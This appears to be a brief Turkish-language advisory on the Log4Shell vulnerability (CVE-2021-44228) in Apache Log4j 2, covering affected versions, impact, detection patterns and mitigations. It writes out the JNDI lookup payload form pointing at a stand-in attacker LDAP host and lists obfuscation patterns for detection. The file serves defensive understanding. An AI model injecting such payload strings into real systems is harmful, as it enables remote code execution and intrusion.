# CVE-2021-44228 — Log4Shell (ornek bilgi dosyasi)

Apache Log4j 2 kutuphanesinde (2.0-beta9 .. 2.14.1) kritik bir uzaktan kod calistirma
(RCE) zafiyeti. JNDI lookup ozelligi, loglanan kullanici girdisindeki
`${jndi:ldap://saldirgan/...}` ifadesini isleyerek uzak bir sunucudan kotu amacli
Java sinifi yukleyip calistirabilir.

## Etki
- Uzaktan kod calistirma, kimlik dogrulama gerekmez.
- CVSS 10.0 (kritik).

## Tespit
- Loglarda `${jndi:`, `${env:`, `${lower:` gibi obfuscation desenleri.
- Giden beklenmedik LDAP/RMI/DNS baglantilari.

## Azaltma
- Log4j'i 2.17.1+ surumune yukselt.
- `log4j2.formatMsgNoLookups=true` veya JndiLookup sinifini kaldir.
- WAF kurallari ile bilinen payload desenlerini engelle (gecici onlem).
